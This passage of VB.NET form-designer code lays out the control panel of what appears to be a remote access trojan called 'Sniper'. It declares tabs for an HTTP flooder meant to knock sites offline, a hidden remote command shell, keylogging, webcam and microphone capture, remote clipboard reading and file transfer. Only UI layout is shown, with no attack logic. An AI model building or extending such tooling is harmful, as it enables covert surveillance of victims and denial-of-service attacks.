        Me.tbDD.Name = "tbDD"
        Me.tbDD.Padding = New System.Windows.Forms.Padding(3)
        Me.tbDD.Size = New System.Drawing.Size(544, 460)
        Me.tbDD.TabIndex = 10
        Me.tbDD.Text = "Http Flooder"
        '
        'lblTipFloo
        '
        Me.lblTipFloo.AutoSize = True
        Me.lblTipFloo.Font = New System.Drawing.Font("Microsoft Sans Serif", 6.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lblTipFloo.Location = New System.Drawing.Point(30, 126)
        Me.lblTipFloo.Name = "lblTipFloo"
        Me.lblTipFloo.Size = New System.Drawing.Size(490, 12)
        Me.lblTipFloo.TabIndex = 7
        Me.lblTipFloo.Text = "Tip: With this feature you can block a site by flooding it with a lot of data. Mo" & _
            "re connected clients = more powerful attack"
        '
        'grpFlloo
        '
        Me.grpFlloo.Controls.Add(Me.cmdstaFlo)
        Me.grpFlloo.Controls.Add(Me.nudFloo)
        Me.grpFlloo.Controls.Add(Me.lblTimes)
        Me.grpFlloo.Controls.Add(Me.txtUFlo)
        Me.grpFlloo.Controls.Add(Me.lblUFlo)
        Me.grpFlloo.Location = New System.Drawing.Point(148, 141)
        Me.grpFlloo.Name = "grpFlloo"
        Me.grpFlloo.Size = New System.Drawing.Size(258, 114)
        Me.grpFlloo.TabIndex = 6
        Me.grpFlloo.TabStop = False
        Me.grpFlloo.Text = "Http Flooder settings"
        '
        'cmdstaFlo
        '
        Me.cmdstaFlo.Location = New System.Drawing.Point(23, 78)
        Me.cmdstaFlo.Name = "cmdstaFlo"
        Me.cmdstaFlo.Size = New System.Drawing.Size(219, 23)
        Me.cmdstaFlo.TabIndex = 10
        Me.cmdstaFlo.Text = "Start flooder"
        Me.cmdstaFlo.UseVisualStyleBackColor = True
        '
        'nudFloo
        '
        Me.nudFloo.Location = New System.Drawing.Point(102, 45)
        Me.nudFloo.Maximum = New Decimal(New Integer() {999999999, 0, 0, 0})
        Me.nudFloo.Minimum = New Decimal(New Integer() {1, 0, 0, 0})
        Me.nudFloo.Name = "nudFloo"
        Me.nudFloo.Size = New System.Drawing.Size(140, 20)
        Me.nudFloo.TabIndex = 9
        Me.nudFloo.Value = New Decimal(New Integer() {99999999, 0, 0, 0})
        '
        'lblTimes
        '
        Me.lblTimes.AutoSize = True
        Me.lblTimes.Location = New System.Drawing.Point(23, 49)
        Me.lblTimes.Name = "lblTimes"
        Me.lblTimes.Size = New System.Drawing.Size(73, 13)
        Me.lblTimes.TabIndex = 8
        Me.lblTimes.Text = "How long for?"
        '
        'txtUFlo
        '
        Me.txtUFlo.Location = New System.Drawing.Point(62, 19)
        Me.txtUFlo.Name = "txtUFlo"
        Me.txtUFlo.Size = New System.Drawing.Size(180, 20)
        Me.txtUFlo.TabIndex = 7
        Me.txtUFlo.Text = "www.google.it"
        '
        'lblUFlo
        '
        Me.lblUFlo.AutoSize = True
        Me.lblUFlo.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lblUFlo.Location = New System.Drawing.Point(20, 22)
        Me.lblUFlo.Name = "lblUFlo"
        Me.lblUFlo.Size = New System.Drawing.Size(36, 13)
        Me.lblUFlo.TabIndex = 6
        Me.lblUFlo.Text = "URL:"
        '
        'tbCMD
        '
        Me.tbCMD.BackColor = System.Drawing.SystemColors.Control
        Me.tbCMD.Controls.Add(Me.cmdGETOUT)
        Me.tbCMD.Controls.Add(Me.chkHCR)
        Me.tbCMD.Controls.Add(Me.cmdCCMDO)
        Me.tbCMD.Controls.Add(Me.cmdSECMD)
        Me.tbCMD.Controls.Add(Me.txtCOMCMD)
        Me.tbCMD.Controls.Add(Me.txtCMDOUT)
        Me.tbCMD.Location = New System.Drawing.Point(4, 22)
        Me.tbCMD.Name = "tbCMD"
        Me.tbCMD.Padding = New System.Windows.Forms.Padding(3)
        Me.tbCMD.Size = New System.Drawing.Size(544, 460)
        Me.tbCMD.TabIndex = 11
        Me.tbCMD.Text = "Remote CMD"
        '
        'cmdGETOUT
        '
        Me.cmdGETOUT.Location = New System.Drawing.Point(364, 4)
        Me.cmdGETOUT.Name = "cmdGETOUT"
        Me.cmdGETOUT.Size = New System.Drawing.Size(174, 23)
        Me.cmdGETOUT.TabIndex = 5
        Me.cmdGETOUT.Text = "Get CMD Output"
        Me.cmdGETOUT.UseVisualStyleBackColor = True
        '
        'chkHCR
        '
        Me.chkHCR.AutoSize = True
        Me.chkHCR.Location = New System.Drawing.Point(7, 8)
        Me.chkHCR.Name = "chkHCR"
        Me.chkHCR.Size = New System.Drawing.Size(110, 17)
        Me.chkHCR.TabIndex = 4
        Me.chkHCR.Text = "Hide remote CMD"
        Me.chkHCR.UseVisualStyleBackColor = True
        '
        'cmdCCMDO
        '
        Me.cmdCCMDO.Location = New System.Drawing.Point(432, 431)
        Me.cmdCCMDO.Name = "cmdCCMDO"
        Me.cmdCCMDO.Size = New System.Drawing.Size(106, 23)
        Me.cmdCCMDO.TabIndex = 3
        Me.cmdCCMDO.Text = "Clear cmd output"
        Me.cmdCCMDO.UseVisualStyleBackColor = True
        '
        'cmdSECMD
        '
        Me.cmdSECMD.Location = New System.Drawing.Point(432, 395)
        Me.cmdSECMD.Name = "cmdSECMD"
        Me.cmdSECMD.Size = New System.Drawing.Size(106, 23)
        Me.cmdSECMD.TabIndex = 2
        Me.cmdSECMD.Text = "Send command"
        Me.cmdSECMD.UseVisualStyleBackColor = True
        '
        'txtCOMCMD
        '
        Me.txtCOMCMD.BackColor = System.Drawing.Color.Black
        Me.txtCOMCMD.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.txtCOMCMD.ForeColor = System.Drawing.Color.White
        Me.txtCOMCMD.Location = New System.Drawing.Point(7, 395)
        Me.txtCOMCMD.Multiline = True
        Me.txtCOMCMD.Name = "txtCOMCMD"
        Me.txtCOMCMD.ScrollBars = System.Windows.Forms.ScrollBars.Both
        Me.txtCOMCMD.Size = New System.Drawing.Size(419, 61)
        Me.txtCOMCMD.TabIndex = 1
        '
        'txtCMDOUT
        '
        Me.txtCMDOUT.BackColor = System.Drawing.Color.Black
        Me.txtCMDOUT.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.txtCMDOUT.ForeColor = System.Drawing.Color.White
        Me.txtCMDOUT.Location = New System.Drawing.Point(7, 31)
        Me.txtCMDOUT.Multiline = True
        Me.txtCMDOUT.Name = "txtCMDOUT"
        Me.txtCMDOUT.ReadOnly = True
        Me.txtCMDOUT.ScrollBars = System.Windows.Forms.ScrollBars.Both
        Me.txtCMDOUT.Size = New System.Drawing.Size(531, 358)
        Me.txtCMDOUT.TabIndex = 0
        '
        'tbpRegRun
        '
        Me.tbpRegRun.BackColor = System.Drawing.SystemColors.Control
        Me.tbpRegRun.Controls.Add(Me.cmdCleLst)
        Me.tbpRegRun.Controls.Add(Me.cmdGetRunC)
        Me.tbpRegRun.Controls.Add(Me.lstRunSo)
        Me.tbpRegRun.Location = New System.Drawing.Point(4, 22)
        Me.tbpRegRun.Name = "tbpRegRun"
        Me.tbpRegRun.Padding = New System.Windows.Forms.Padding(3)
        Me.tbpRegRun.Size = New System.Drawing.Size(544, 460)
        Me.tbpRegRun.TabIndex = 12
        Me.tbpRegRun.Text = "Software manager"
        '
        'cmdCleLst
        '
        Me.cmdCleLst.Location = New System.Drawing.Point(415, 420)
        Me.cmdCleLst.Name = "cmdCleLst"
        Me.cmdCleLst.Size = New System.Drawing.Size(123, 24)
        Me.cmdCleLst.TabIndex = 3
        Me.cmdCleLst.Text = "Clear List"
        Me.cmdCleLst.UseVisualStyleBackColor = True
        '
        'cmdGetRunC
        '
        Me.cmdGetRunC.Location = New System.Drawing.Point(7, 420)
        Me.cmdGetRunC.Name = "cmdGetRunC"
        Me.cmdGetRunC.Size = New System.Drawing.Size(123, 24)
        Me.cmdGetRunC.TabIndex = 1
        Me.cmdGetRunC.Text = "Get Software"
        Me.cmdGetRunC.UseVisualStyleBackColor = True
        '
        'lstRunSo
        '
        Me.lstRunSo.FormattingEnabled = True
        Me.lstRunSo.Location = New System.Drawing.Point(7, 7)
        Me.lstRunSo.Name = "lstRunSo"
        Me.lstRunSo.Size = New System.Drawing.Size(531, 407)
        Me.lstRunSo.TabIndex = 0
        '
        'tmrPannWeb
        '
        Me.tmrPannWeb.Interval = 1
        '
        'cxmstrWeb
        '
        Me.cxmstrWeb.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.StartListeningToolStripMenuItem2, Me.CloseConnectionToolStripMenuItem3})
        Me.cxmstrWeb.Name = "cxmstrWeb"
        Me.cxmstrWeb.Size = New System.Drawing.Size(167, 48)
        '
        'StartListeningToolStripMenuItem2
        '
        Me.StartListeningToolStripMenuItem2.Image = Global.Sniper.My.Resources.Resources._1300106901_3121
        Me.StartListeningToolStripMenuItem2.Name = "StartListeningToolStripMenuItem2"
        Me.StartListeningToolStripMenuItem2.Size = New System.Drawing.Size(166, 22)
        Me.StartListeningToolStripMenuItem2.Text = "Start listening"
        '
        'CloseConnectionToolStripMenuItem3
        '
        Me.CloseConnectionToolStripMenuItem3.Image = Global.Sniper.My.Resources.Resources._1300106922_close1
        Me.CloseConnectionToolStripMenuItem3.Name = "CloseConnectionToolStripMenuItem3"
        Me.CloseConnectionToolStripMenuItem3.Size = New System.Drawing.Size(166, 22)
        Me.CloseConnectionToolStripMenuItem3.Text = "Close connection"
        '
        'tmrDatiWeb
        '
        Me.tmrDatiWeb.Interval = 1
        '
        'cxmstrKey
        '
        Me.cxmstrKey.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.StartListeningToolStripMenuItem3, Me.CloseConnectionToolStripMenuItem4})
        Me.cxmstrKey.Name = "cxmstrKey"
        Me.cxmstrKey.Size = New System.Drawing.Size(167, 48)
        '
        'StartListeningToolStripMenuItem3
        '
        Me.StartListeningToolStripMenuItem3.Image = Global.Sniper.My.Resources.Resources._1300106901_3121
        Me.StartListeningToolStripMenuItem3.Name = "StartListeningToolStripMenuItem3"
        Me.StartListeningToolStripMenuItem3.Size = New System.Drawing.Size(166, 22)
        Me.StartListeningToolStripMenuItem3.Text = "Start listening"
        '
        'CloseConnectionToolStripMenuItem4
        '
        Me.CloseConnectionToolStripMenuItem4.Image = Global.Sniper.My.Resources.Resources._1300106922_close
        Me.CloseConnectionToolStripMenuItem4.Name = "CloseConnectionToolStripMenuItem4"
        Me.CloseConnectionToolStripMenuItem4.Size = New System.Drawing.Size(166, 22)
        Me.CloseConnectionToolStripMenuItem4.Text = "Close connection"
        '
        'tmrDatiKey
        '
        Me.tmrDatiKey.Interval = 1
        '
        'tmrPannKey
        '
        Me.tmrPannKey.Interval = 1
        '
        'cxmstrClip
        '
        Me.cxmstrClip.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.AddValueToolStripMenuItem, Me.DeleteSelectedToolStripMenuItem, Me.ClearListToolStripMenuItem, Me.ClearListToolStripMenuItem1, Me.SendYourClipboardToolStripMenuItem})
        Me.cxmstrClip.Name = "cxmstrClip"
        Me.cxmstrClip.Size = New System.Drawing.Size(200, 114)
        '
        'AddValueToolStripMenuItem
        '
        Me.AddValueToolStripMenuItem.Image = Global.Sniper.My.Resources.Resources._1306589090_Applications
        Me.AddValueToolStripMenuItem.Name = "AddValueToolStripMenuItem"
        Me.AddValueToolStripMenuItem.Size = New System.Drawing.Size(199, 22)
        Me.AddValueToolStripMenuItem.Text = "Add value"
        '
        'DeleteSelectedToolStripMenuItem
        '
        Me.DeleteSelectedToolStripMenuItem.Image = Global.Sniper.My.Resources.Resources._1306589186_book
        Me.DeleteSelectedToolStripMenuItem.Name = "DeleteSelectedToolStripMenuItem"
        Me.DeleteSelectedToolStripMenuItem.Size = New System.Drawing.Size(199, 22)
        Me.DeleteSelectedToolStripMenuItem.Text = "Read Remote Clipboard"
        '
        'ClearListToolStripMenuItem
        '
        Me.ClearListToolStripMenuItem.Image = Global.Sniper.My.Resources.Resources._1301605527_Error
        Me.ClearListToolStripMenuItem.Name = "ClearListToolStripMenuItem"
        Me.ClearListToolStripMenuItem.Size = New System.Drawing.Size(199, 22)
        Me.ClearListToolStripMenuItem.Text = "Delete selected"
        '
        'ClearListToolStripMenuItem1
        '
        Me.ClearListToolStripMenuItem1.Image = Global.Sniper.My.Resources.Resources._1306589281_edit_clear
        Me.ClearListToolStripMenuItem1.Name = "ClearListToolStripMenuItem1"
        Me.ClearListToolStripMenuItem1.Size = New System.Drawing.Size(199, 22)
        Me.ClearListToolStripMenuItem1.Text = "Clear list"
        '
        'SendYourClipboardToolStripMenuItem
        '
        Me.SendYourClipboardToolStripMenuItem.Image = Global.Sniper.My.Resources.Resources._1295815739_old_go_top
        Me.SendYourClipboardToolStripMenuItem.Name = "SendYourClipboardToolStripMenuItem"
        Me.SendYourClipboardToolStripMenuItem.Size = New System.Drawing.Size(199, 22)
        Me.SendYourClipboardToolStripMenuItem.Text = "Send your Clipboard"
        '
        'cxmstrSou
        '
        Me.cxmstrSou.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.StartListeningToolStripMenuItem4, Me.CloseConnectionToolStripMenuItem5})
        Me.cxmstrSou.Name = "cxmstrSou"
        Me.cxmstrSou.Size = New System.Drawing.Size(167, 48)
        '
        'StartListeningToolStripMenuItem4
        '
        Me.StartListeningToolStripMenuItem4.Image = Global.Sniper.My.Resources.Resources._1300106901_3122
        Me.StartListeningToolStripMenuItem4.Name = "StartListeningToolStripMenuItem4"
        Me.StartListeningToolStripMenuItem4.Size = New System.Drawing.Size(166, 22)
        Me.StartListeningToolStripMenuItem4.Text = "Start listening"
        '
        'CloseConnectionToolStripMenuItem5
        '
        Me.CloseConnectionToolStripMenuItem5.Image = Global.Sniper.My.Resources.Resources._1300106922_close
        Me.CloseConnectionToolStripMenuItem5.Name = "CloseConnectionToolStripMenuItem5"
        Me.CloseConnectionToolStripMenuItem5.Size = New System.Drawing.Size(166, 22)
        Me.CloseConnectionToolStripMenuItem5.Text = "Close connection"
        '
        'tmrPannSuono
        '
        Me.tmrPannSuono.Interval = 1
        '
        'tmrDatiSuono
        '
        Me.tmrDatiSuono.Interval = 1
        '
        'bkwSD
        '
        '
        'picDisPC
        '
        Me.picDisPC.Image = Global.Sniper.My.Resources.Resources._1295813182_Internet_Explorer
        Me.picDisPC.Location = New System.Drawing.Point(528, 27)
        Me.picDisPC.Name = "picDisPC"
        Me.picDisPC.Size = New System.Drawing.Size(35, 32)
        Me.picDisPC.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.picDisPC.TabIndex = 14
        Me.picDisPC.TabStop = False
        '
        'frmControlPanel
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(576, 590)
        Me.Controls.Add(Me.txtFeD)
        Me.Controls.Add(Me.txtProID)
        Me.Controls.Add(Me.lblExIp)
        Me.Controls.Add(Me.lblIP)
        Me.Controls.Add(Me.lblBanCP)
        Me.Controls.Add(Me.lblCl)
        Me.Controls.Add(Me.lblClid)
        Me.Controls.Add(Me.picDisPC)
        Me.Controls.Add(Me.tbcPannello)
        Me.Controls.Add(Me.grpStatusP)
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.MaximizeBox = False
        Me.Name = "frmControlPanel"
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "Control panel -"
        Me.grpStatusP.ResumeLayout(False)
        Me.grpStatusP.PerformLayout()
        CType(Me.picSou, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.picDow, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.picUp, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.picKey, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.picWeb, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.picScreen, System.ComponentModel.ISupportInitialize).EndInit()
        Me.cxmstrFileEDir.ResumeLayout(False)
        Me.cxmstrPoSch.ResumeLayout(False)
        Me.cxmstrPoDow.ResumeLayout(False)
        Me.cxmstrDow.ResumeLayout(False)
        Me.cxmstrPoUp.ResumeLayout(False)
        Me.cxmstrUp.ResumeLayout(False)
        Me.tbpWebc.ResumeLayout(False)
        Me.tbpWebc.PerformLayout()
        Me.grpQuImm.ResumeLayout(False)
        Me.grpQuImm.PerformLayout()
        CType(Me.nudQW, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.picBanWeb, System.ComponentModel.ISupportInitialize).EndInit()
        Me.tbcMex.ResumeLayout(False)
        Me.tbcMex.PerformLayout()
        Me.grpInvMex.ResumeLayout(False)
        Me.grpInvMex.PerformLayout()
        Me.grpchkDom.ResumeLayout(False)
        Me.grpchkDom.PerformLayout()
        Me.grpMT.ResumeLayout(False)
        Me.grpMT.PerformLayout()
        Me.tbpFileMan.ResumeLayout(False)
        Me.tbcFilesDDU.ResumeLayout(False)
        Me.tbpFD.ResumeLayout(False)
        Me.tbpFD.PerformLayout()
        Me.tbpDAUIP.ResumeLayout(False)
        Me.tbpDAUIP.PerformLayout()
        Me.tb2.ResumeLayout(False)
        CType(Me.picBanDesk, System.ComponentModel.ISupportInitialize).EndInit()
        Me.grpPMang.ResumeLayout(False)
        Me.grpPMang.PerformLayout()
        Me.grpScrSS.ResumeLayout(False)
        Me.grpScrSS.PerformLayout()
        Me.tb1.ResumeLayout(False)
        Me.tb1.PerformLayout()
        Me.tcTask.ResumeLayout(False)
        Me.tbPL.ResumeLayout(False)
        Me.grpWinRem.ResumeLayout(False)
        Me.grpTask.ResumeLayout(False)
        Me.grpTask.PerformLayout()
        CType(Me.picStart, System.ComponentModel.ISupportInitialize).EndInit()
        Me.tbcPannello.ResumeLayout(False)
        Me.tbpKey.ResumeLayout(False)
        Me.tbpKey.PerformLayout()
        CType(Me.picKB, System.ComponentModel.ISupportInitialize).EndInit()
        Me.tbMicroP.ResumeLayout(False)
        Me.tbMicroP.PerformLayout()
        Me.grpVolR.ResumeLayout(False)
        CType(Me.picSound, System.ComponentModel.ISupportInitialize).EndInit()
        Me.grpLocRec.ResumeLayout(False)
        Me.grpLocRec.PerformLayout()
        Me.grpS1.ResumeLayout(False)
        Me.grpS1.PerformLayout()
        Me.tbpChat.ResumeLayout(False)
        Me.tbpChat.PerformLayout()
        Me.tbPorts.ResumeLayout(False)
        Me.grpPS.ResumeLayout(False)
        Me.grpPS.PerformLayout()
        CType(Me.picF, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.nudSD, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.nudD, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.nudU, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.NudK, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.nudW, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.nudS, System.ComponentModel.ISupportInitialize).EndInit()
        Me.tbClip.ResumeLayout(False)
        Me.tbClip.PerformLayout()
        Me.tbDD.ResumeLayout(False)
        Me.tbDD.PerformLayout()
        Me.grpFlloo.ResumeLayout(False)
        Me.grpFlloo.PerformLayout()
        CType(Me.nudFloo, System.ComponentModel.ISupportInitialize).EndInit()
        Me.tbCMD.ResumeLayout(False)
        Me.tbCMD.PerformLayout()
        Me.tbpRegRun.ResumeLayout(False)
        Me.cxmstrWeb.ResumeLayout(False)
        Me.cxmstrKey.ResumeLayout(False)
        Me.cxmstrClip.ResumeLayout(False)
        Me.cxmstrSou.ResumeLayout(False)
        CType(Me.picDisPC, System.ComponentModel.ISupportInitialize).EndInit()
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub
    Friend WithEvents lblCl As System.Windows.Forms.Label
    Friend WithEvents lblClid As System.Windows.Forms.Label
    Friend WithEvents tmrDatiPann As System.Windows.Forms.Timer
    Friend WithEvents lblBanCP As System.Windows.Forms.Label
    Friend WithEvents lblIP As System.Windows.Forms.Label
    Friend WithEvents lblExIp As System.Windows.Forms.Label
    Friend WithEvents picDisPC As System.Windows.Forms.PictureBox
    Friend WithEvents txtProID As System.Windows.Forms.TextBox
    Friend WithEvents grpStatusP As System.Windows.Forms.GroupBox
    Friend WithEvents picWeb As System.Windows.Forms.PictureBox
    Friend WithEvents lblWeb As System.Windows.Forms.Label
    Friend WithEvents picScreen As System.Windows.Forms.PictureBox
    Friend WithEvents lblScre As System.Windows.Forms.Label
    Friend WithEvents picSou As System.Windows.Forms.PictureBox
    Friend WithEvents lblSu As System.Windows.Forms.Label
    Friend WithEvents picDow As System.Windows.Forms.PictureBox
    Friend WithEvents lblDow As System.Windows.Forms.Label
    Friend WithEvents picUp As System.Windows.Forms.PictureBox
    Friend WithEvents lblUp As System.Windows.Forms.Label
    Friend WithEvents picKey As System.Windows.Forms.PictureBox
    Friend WithEvents lblKey As System.Windows.Forms.Label
    Friend WithEvents tmrPannSchermo As System.Windows.Forms.Timer
    Friend WithEvents tmrDatiSchermo As System.Windows.Forms.Timer
    Friend WithEvents txtFeD As System.Windows.Forms.TextBox
    Friend WithEvents cxmstrFileEDir As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents RefreshToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents DeleteFileToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents DeleteEmptyFolderToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RenameFileToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RenameFolderToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents StartFileToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents CopyToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents PasteToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ToolStripSeparator1 As System.Windows.Forms.ToolStripSeparator
    Friend WithEvents AddToDownloadListToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents AddInUploadInProgressListToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents MakeANewFolderToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents cxmstrPoSch As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents StartListeningToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents CloseConnectionToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents cxmstrPoDow As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents StartListeningToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents CloseConnectionToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents tmrPannDow As System.Windows.Forms.Timer
    Friend WithEvents tmrDatiDow As System.Windows.Forms.Timer
    Friend WithEvents cxmstrDow As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents RemoveFromTheListToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents SetAsWallpaperToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents tmrPannUp As System.Windows.Forms.Timer
    Friend WithEvents tmrDatiUp As System.Windows.Forms.Timer
    Friend WithEvents cxmstrPoUp As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents StartToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents CloseConnectionToolStripMenuItem2 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents cmdInfoPorte As System.Windows.Forms.Button
    Friend WithEvents cxmstrUp As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents RemoveFileFromTheListToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents tbpWebc As System.Windows.Forms.TabPage
    Friend WithEvents picBanWeb As System.Windows.Forms.PictureBox
    Friend WithEvents cmdOpImmW As System.Windows.Forms.Button
    Friend WithEvents grpQuImm As System.Windows.Forms.GroupBox
    Friend WithEvents cmdSetPerW As System.Windows.Forms.Button
    Friend WithEvents lblQuaW As System.Windows.Forms.Label
    Friend WithEvents nudQW As System.Windows.Forms.NumericUpDown
    Friend WithEvents cmdSetW As System.Windows.Forms.Button
    Friend WithEvents lblFormWXY As System.Windows.Forms.Label
    Friend WithEvents lblkbWeb As System.Windows.Forms.Label
    Friend WithEvents prgDatiWeb As System.Windows.Forms.ProgressBar
    Friend WithEvents cmdGTW As System.Windows.Forms.Button
    Friend WithEvents combDri As System.Windows.Forms.ComboBox
    Friend WithEvents lblDrivAV As System.Windows.Forms.Label
    Friend WithEvents tbcMex As System.Windows.Forms.TabPage
    Friend WithEvents txtLogmex As System.Windows.Forms.TextBox
    Friend WithEvents lblLog As System.Windows.Forms.Label
    Friend WithEvents grpInvMex As System.Windows.Forms.GroupBox
    Friend WithEvents cmdCTEMR As System.Windows.Forms.Button
    Friend WithEvents cmdClearlogMex As System.Windows.Forms.Button
    Friend WithEvents cmdSendmex As System.Windows.Forms.Button
    Friend WithEvents cmdTestMex As System.Windows.Forms.Button
    Friend WithEvents txtMess As System.Windows.Forms.TextBox
    Friend WithEvents lblMex As System.Windows.Forms.Label
    Friend WithEvents txtTitle As System.Windows.Forms.TextBox
    Friend WithEvents lblTitleMex As System.Windows.Forms.Label
    Friend WithEvents grpchkDom As System.Windows.Forms.GroupBox
    Friend WithEvents rbutYNI As System.Windows.Forms.RadioButton
    Friend WithEvents rbutYNC As System.Windows.Forms.RadioButton
    Friend WithEvents rbutYN As System.Windows.Forms.RadioButton
    Friend WithEvents grpMT As System.Windows.Forms.GroupBox
    Friend WithEvents lblMStyle As System.Windows.Forms.Label
    Friend WithEvents lblSSB As System.Windows.Forms.Label
    Friend WithEvents cmdNothg As System.Windows.Forms.Button
    Friend WithEvents cmdDom As System.Windows.Forms.Button
    Friend WithEvents cmdWa As System.Windows.Forms.Button
    Friend WithEvents cmdEr As System.Windows.Forms.Button
    Friend WithEvents cmdInfo As System.Windows.Forms.Button
    Friend WithEvents tbpFileMan As System.Windows.Forms.TabPage
    Friend WithEvents tbcFilesDDU As System.Windows.Forms.TabControl
    Friend WithEvents tbpFD As System.Windows.Forms.TabPage
    Friend WithEvents txtPath As System.Windows.Forms.TextBox
    Friend WithEvents cmdGetDr As System.Windows.Forms.Button
    Friend WithEvents lblInfoFD As System.Windows.Forms.Label
    Friend WithEvents chkModListFD As System.Windows.Forms.CheckBox
    Friend WithEvents cmdCCListFD As System.Windows.Forms.Button
    Friend WithEvents lstwFileFolderR As System.Windows.Forms.ListView
    Friend WithEvents tbpDAUIP As System.Windows.Forms.TabPage
    Friend WithEvents lblStatUp As System.Windows.Forms.Label
    Friend WithEvents lblBytesD As System.Windows.Forms.Label
    Friend WithEvents chkAvvFFUp As System.Windows.Forms.CheckBox
    Friend WithEvents cmsStartUp As System.Windows.Forms.Button
    Friend WithEvents cmdStartDow As System.Windows.Forms.Button
    Friend WithEvents prgDown As System.Windows.Forms.ProgressBar
    Friend WithEvents lblUpping As System.Windows.Forms.Label
    Friend WithEvents lblDowwing As System.Windows.Forms.Label
    Friend WithEvents chkAvvFFin As System.Windows.Forms.CheckBox
    Friend WithEvents cmdSPing As System.Windows.Forms.Button
    Friend WithEvents cmdSDing As System.Windows.Forms.Button
    Friend WithEvents lstwUpL As System.Windows.Forms.ListView
    Friend WithEvents lstwDowL As System.Windows.Forms.ListView
    Friend WithEvents tb2 As System.Windows.Forms.TabPage
    Friend WithEvents picBanDesk As System.Windows.Forms.PictureBox
    Friend WithEvents grpPMang As System.Windows.Forms.GroupBox
    Friend WithEvents cmdResText As System.Windows.Forms.Button
    Friend WithEvents cmdCancellaTestoP As System.Windows.Forms.Button
    Friend WithEvents cmdPiPP As System.Windows.Forms.Button
    Friend WithEvents cmdPrintOnDesk As System.Windows.Forms.Button
    Friend WithEvents txtTesto As System.Windows.Forms.TextBox
    Friend WithEvents grpScrSS As System.Windows.Forms.GroupBox
    Friend WithEvents cmdHWR As System.Windows.Forms.Button
    Friend WithEvents lblYN As System.Windows.Forms.Label
    Friend WithEvents lblY As System.Windows.Forms.Label
    Friend WithEvents lblXN As System.Windows.Forms.Label
    Friend WithEvents lblX As System.Windows.Forms.Label
    Friend WithEvents cmdGDSR As System.Windows.Forms.Button
    Friend WithEvents cmdVisII As System.Windows.Forms.Button
    Friend WithEvents tb1 As System.Windows.Forms.TabPage
    Friend WithEvents lblClip As System.Windows.Forms.Label
    Friend WithEvents txtClip As System.Windows.Forms.TextBox
    Friend WithEvents tcTask As System.Windows.Forms.TabControl
    Friend WithEvents tbPL As System.Windows.Forms.TabPage
    Friend WithEvents lstwProcessi As System.Windows.Forms.ListView
    Friend WithEvents grpWinRem As System.Windows.Forms.GroupBox
    Friend WithEvents cmdHid As System.Windows.Forms.Button
    Friend WithEvents cmdRes As System.Windows.Forms.Button
    Friend WithEvents cmdMin As System.Windows.Forms.Button
    Friend WithEvents cmdMax As System.Windows.Forms.Button
    Friend WithEvents grpTask As System.Windows.Forms.GroupBox
    Friend WithEvents picStart As System.Windows.Forms.PictureBox
    Friend WithEvents rbtMa As System.Windows.Forms.RadioButton
    Friend WithEvents rbtMi As System.Windows.Forms.RadioButton
    Friend WithEvents rbtNo As System.Windows.Forms.RadioButton
